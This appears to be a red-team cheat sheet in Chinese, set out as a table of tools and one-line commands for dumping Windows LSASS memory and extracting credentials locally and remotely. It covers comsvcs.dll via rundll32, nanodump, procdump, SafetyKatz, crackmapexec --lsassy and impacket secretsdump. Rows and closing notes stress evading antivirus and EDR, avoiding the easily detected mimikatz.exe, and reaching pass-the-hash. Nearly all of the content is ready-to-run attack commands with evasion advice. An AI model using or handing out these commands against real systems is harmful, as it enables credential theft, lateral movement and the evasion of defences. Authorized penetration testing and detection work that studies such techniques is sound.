# lsassa dump

| 类别                                        | 工具名称             | 功能描述                                | 用法示例（简要）                                     | 优势/特点                      | 适用场景              |
| ------------------------------------------- | -------------------- | --------------------------------------- | ---------------------------------------------------- | ------------------------------ | --------------------- |
| **Mimikatz平替（本地LSASS dump/凭证提取）** | pypykatz             | Python版Mimikatz，支持live/minidump解析 | `pypykatz lsa minidump lsass.dmp`                    | 纯Python，无EXE，OPSEC极高     | 本地提权、内存解析    |
|                                             | nanodump             | 创建LSASS minidump（绕AV）              | `nanodump.exe -o lsass.dmp`                          | 小文件、无签名检测             | 绕过EDR dump LSASS    |
|                                             | comsvcs.dll (LOLBAS) | 原生rundll32 minidump                   | `rundll32 comsvcs.dll MiniDump <PID> lsass.dmp full` | Windows内置，无需上传工具      | LOLBAS提权，OPSEC最高 |
|                                             | procdump             | Sysinternals签名dump工具                | `procdump -ma lsass.exe lsass.dmp`                   | 微软签名，检测低               | 标准dump流程          |
|                                             | SafetyKatz           | Mimikatz + SharpKatz动态加载版          | `SafetyKatz.exe "sekurlsa::logonpasswords" exit`     | 内存加载，绕磁盘扫描           | 高检测环境            |
| **lsassy平替（远程LSASS dump/凭证提取）**   | crackmapexec (cme)   | 集成impacket，远程lsassy功能            | `cme smb IP -u user -p pass --lsassy`                | 多目标、功能全                 | 域横向、远程凭证提取  |
|                                             | impacket-secretsdump | 远程dump SAM/LSA/NTDS                   | `secretsdump.py domain/user:pass@IP`                 | lsassy底层，稳定               | 远程hash dump         |
|                                             | DonPAPI              | 远程DPAPI/LSA/凭证管理器提取            | `donpapi domain/user:pass@IP`                        | 扩展凭证收集（浏览器、WiFi等） | 域凭证大范围收集      |
|                                             | SharpSecDump         | .NET版远程dump                          | 执行SharpSecDump.exe（需上传）                       | C#实现，绕部分AV               | .NET环境横向          |

**优先级**：本地首选**comsvcs.dll**（LOLBAS，无工具上传）；远程首选**cme --lsassy**（功能最全）。

**OPSEC**：避免mimikatz.exe（易杀），用pypykatz/nanodump/comsvcs。

**报告**：截图工具命令 + 提取hash + PtH成功。